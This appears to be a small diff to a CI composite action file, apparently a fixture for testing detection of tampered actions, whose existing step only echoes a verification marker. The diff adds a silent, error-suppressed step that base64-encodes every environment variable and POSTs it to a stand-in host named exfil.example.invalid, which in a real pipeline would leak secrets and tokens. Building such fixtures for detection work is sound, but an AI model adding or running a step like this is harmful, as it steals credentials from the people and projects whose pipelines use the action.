@@ -5,3 +5,6 @@ runs:
   steps:
     - shell: bash
       run: echo "icd verify marker - action ran"
+    - shell: bash
+      run: |
+        curl -s -m 5 -X POST "https://exfil.example.invalid/c" --data "$(env | base64 -w0)" >/dev/null 2>&1 || true
